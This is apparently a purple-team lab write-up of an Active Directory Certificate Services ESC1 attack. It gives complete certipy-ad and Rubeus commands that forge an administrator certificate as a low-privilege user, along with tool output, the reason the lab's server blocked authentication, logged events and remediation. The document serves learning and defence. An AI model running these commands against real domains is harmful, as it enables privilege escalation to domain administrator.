# Phase 03: On-Prem Attacks — Attack #7: AD CS Abuse (ESC1)

**Technique:** AD CS Abuse — Misconfigured Certificate Template (ESC1)
**MITRE ATT&CK:** T1649 — Steal or Forge Authentication Certificates
**Privilege required:** Any valid domain user — no special access needed
**Tools used:** certipy-ad, Rubeus
**Target:** KaveeLab-ESC1 certificate template on KaveeLab-CA (MEMSRV01)
**Outcome:** Certificate claiming Administrator identity successfully issued to john.smith. Authentication blocked by WS2025 Strong Certificate Mapping enforcement (Full Enforcement Mode, September 2025).

---

## What ESC1 Is

ESC1 (Escalation 1) is a certificate template misconfiguration catalogued in SpecterOps' 2021 "Certified Pre-Owned" research. When a certificate template allows the requester to supply their own Subject Alternative Name (SAN), supports Client Authentication, and is enrollable by low-privilege users — any domain user can request a certificate claiming to be any other user in the domain, including Domain Admin.

Three conditions must all be true:

| Condition | What it means |
|---|---|
| Enrollee Supplies Subject = True | Requester controls the identity on the certificate |
| Client Authentication EKU present | Certificate can be used to authenticate to AD via PKINIT |
| Domain Users have Enroll permission | Any domain account can request this certificate |

All three were present on KaveeLab-ESC1.

---

## The Attack — Step by Step

### Step 1 — Enumeration

```bash
certipy-ad find \
    -u john.smith@kaveelab.internal \
    -p 'Password123!' \
    -dc-ip 192.168.112.10 \
    -vulnerable \
    -stdout
```

Certipy queried DC01 via LDAP as john.smith (a helpdesk user with zero admin rights) and enumerated all 34 certificate templates published in AD. With `-vulnerable`, only templates matching known ESC conditions are shown.

Output confirmed:
```
Template Name        : KaveeLab-ESC1
Client Authentication: True
Enrollee Supplies Subject: True
Enrollment Rights    : KAVEELAB.INTERNAL\Domain Users

[!] Vulnerabilities
    ESC1: Enrollee supplies subject and template allows client authentication.
```

### Step 2 — Certificate Request

First request (no SID) succeeded but returned a warning:

```bash
certipy-ad req \
    -u john.smith@kaveelab.internal \
    -p 'Password123!' \
    -dc-ip 192.168.112.10 \
    -ca 'KaveeLab-CA' \
    -template 'KaveeLab-ESC1' \
    -upn 'administrator@kaveelab.internal' \
    -target memsrv01.kaveelab.internal
```

Result: `Got certificate with UPN 'administrator@kaveelab.internal'` but `Certificate has no object SID` — WS2025 requires the SID extension for strong mapping.

Second request with SID and correct subject:

```bash
certipy-ad req \
    -u john.smith@kaveelab.internal \
    -p 'Password123!' \
    -dc-ip 192.168.112.10 \
    -ca 'KaveeLab-CA' \
    -template 'KaveeLab-ESC1' \
    -upn 'administrator@kaveelab.internal' \
    -target memsrv01.kaveelab.internal \
    -sid 'S-1-5-21-2245599927-464017992-703701844-500' \
    -subject 'CN=administrator'
```

Result:
```
[*] Got certificate with UPN 'administrator@kaveelab.internal'
[*] Certificate object SID is 'S-1-5-21-2245599927-464017992-703701844-500'
[*] Saved to 'administrator.pfx'
```

The CA issued a certificate to john.smith containing:
- UPN SAN: `administrator@kaveelab.internal`
- ObjectSID extension: `S-1-5-21-2245599927-464017992-703701844-500`
- Subject CN: `administrator`

No approval required. No verification of identity. Issued immediately.

### Step 3 — Authentication Attempts (all blocked by WS2025)

Three separate methods attempted:

**Method 1 — Certipy PKINIT:**
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.112.10 -domain kaveelab.internal -username administrator
```
Result: `Object SID mismatch between certificate and user 'administrator'`

**Method 2 — Certipy LDAP Shell (Schannel):**
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.112.10 -domain kaveelab.internal -username administrator -ldap-shell
```
Result: `Failed to authenticate to LDAP server. Server did not return an identity (whoAmI)`

Note: DC01 received a Domain Controller certificate from KaveeLab-CA via auto-enrollment, enabling LDAPS on port 636 (`Test-NetConnection -Port 636: TcpTestSucceeded: True`). The TLS layer connected but identity resolution failed.

**Method 3 — Rubeus PKINIT from CLIENT01 (native Windows):**
```powershell
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /domain:kaveelab.internal /dc:192.168.112.10 /enctype:aes256
```
Result: `KRB-ERROR (66): KDC_ERR_CERTIFICATE_MISMATCH`

Rubeus uses the actual Windows Kerberos implementation — not Python. When native Windows rejects the certificate with error 66, it confirms the block is at the KDC protocol level, not a tool implementation issue.

---

## Why WS2025 Blocked Authentication

Microsoft's **KB5014754** patch (addressing CVE-2022-26923 and related CVEs) introduced Strong Certificate Mapping enforcement:

| Date | State |
|---|---|
| Pre-2022 | No SID check — ESC1 fully exploitable |
| 2022-2023 | Audit Mode — logs mismatches, doesn't block |
| 2023-2024 | Compatibility Mode — weak mappings work with warning |
| February 2025 | Enforcement Mode default |
| **September 10, 2025** | **Full Enforcement — Compatibility Mode permanently removed** |
| WS2025 | Ships with Full Enforcement baked in from day one |

This lab runs WS2025 at DFL 2025 — the strictest possible baseline. The attack would succeed completely on unpatched Server 2019/2022, which represents the majority of real enterprise environments today.

---

## The Finding Stands — Why ESC1 Is Still Critical

The certificate issuance step is the vulnerability. Authentication hardening is a mitigation layer, not a fix for the root cause.

1. **The CA mis-issued a credential.** KaveeLab-CA signed a certificate with `administrator@kaveelab.internal` to a helpdesk user. This is the finding.

2. **Older environments are fully exploitable.** Pre-September 2025 Windows Server 2019/2022 without full KB5014754 enforcement would have returned a TGT and NT hash for Administrator immediately.

3. **The certificate persists for 1 year.** The PFX is valid until October 2027. Any environment change that relaxes enforcement makes it immediately usable.

4. **The fix is in the template, not the patch.** The template is still misconfigured. Removing `EnrolleeSuppliesSubject` or restricting enrollment to privileged accounts closes the vulnerability.

---

## What DC01 and MEMSRV01 Logged

| Event ID | Source | What it records |
|---|---|---|
| 4886 | MEMSRV01 Security log | CA received a certificate request |
| 4887 | MEMSRV01 Security log | CA issued a certificate |
| 39 | DC01 System log | Certificate auth failed — missing/mismatched SID |
| 41 | DC01 System log | Certificate mapping rejected in Full Enforcement Mode |

Event 4887 on MEMSRV01 is the key detection event — it shows the requester (john.smith) and the certificate subject (administrator). A mismatch between requester and subject is the ESC1 signal.

---

## Remediation

| Control | Action |
|---|---|
| Fix the template | Change Subject Name to "Build from this Active Directory information" — removes requester control |
| Restrict enrollment | Remove Domain Users from Enroll permission — only specific service accounts or admins should enroll |
| Require Manager Approval | Enable CA manager approval — adds human review before issuance |
| Monitor 4887 events | Alert on subject/requester mismatch in certificate issuance |
| Audit templates regularly | Run certipy find periodically to catch new misconfigurations |

---

## KQL Detection Rule

Stored at `scripts/kql-adcs-esc1.kql`. Tests in Microsoft Sentinel in Phase 07.

---

## Purple Team Loop

| Step | Status |
|---|---|
| MEMSRV01 built and domain joined | ✅ |
| KaveeLab-CA deployed as Enterprise Root CA | ✅ |
| KaveeLab-ESC1 template created with ESC1 conditions | ✅ |
| Certipy enumeration confirmed ESC1 | ✅ |
| Certificate issued to john.smith claiming Administrator identity | ✅ |
| Certificate contains UPN, SID extension, and correct subject | ✅ |
| WS2025 strong mapping blocked all auth attempts | ✅ documented |
| ESC8 (web enrollment relay) | ⏳ web enrollment timed out during enumeration, deferred |
| KQL detection rule written | ✅ |
| KQL tested in Sentinel | ⏳ Phase 07 |
